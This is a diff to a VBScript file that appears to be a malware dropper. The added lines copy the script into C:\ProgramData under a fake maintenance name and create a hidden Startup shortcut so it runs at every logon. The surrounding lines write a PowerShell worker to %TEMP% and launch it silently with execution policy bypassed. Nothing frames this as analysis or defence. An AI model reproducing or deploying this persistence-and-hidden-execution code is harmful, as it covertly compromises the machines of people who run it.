@@ -4,6 +4,27 @@ Dim objFSO, objShell, strPSPath, objFile, appDataPath, startupPath, strWorkerNam
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
 
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+' Define where the script will "live" permanently
+strPermanentPath = "C:\ProgramData\win_maint_svc.vbs"
+strStartupLnk = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"
+
+' 1. Copy itself to a hidden system folder
+If Not objFSO.FileExists(strPermanentPath) Then
+    objFSO.CopyFile WScript.ScriptFullName, strPermanentPath, True
+End If
+
+' 2. Create the Startup Shortcut if it doesn't exist
+If Not objFSO.FileExists(strStartupLnk) Then
+    Set objShortcut = objShell.CreateShortcut(strStartupLnk)
+    objShortcut.TargetPath = "wscript.exe"
+    objShortcut.Arguments = """" & strPermanentPath & """"
+    objShortcut.WindowStyle = 0 ' Hidden window
+    objShortcut.Save
+End If
+
 ' 1. Config
 strWorkerName = "office_maint_v19.ps1"
 strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
@@ -75,3 +96,4 @@ objFile.Close
 ' 4. Final Execution (Silent)
 
 objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True
+
